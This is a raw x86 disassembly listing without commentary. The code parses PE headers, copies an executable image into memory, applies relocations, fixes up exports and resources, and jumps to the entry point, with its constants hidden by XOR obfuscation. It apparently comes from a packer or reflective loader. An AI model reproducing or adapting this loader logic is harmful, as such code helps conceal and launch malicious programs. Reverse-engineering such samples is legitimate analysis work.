  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
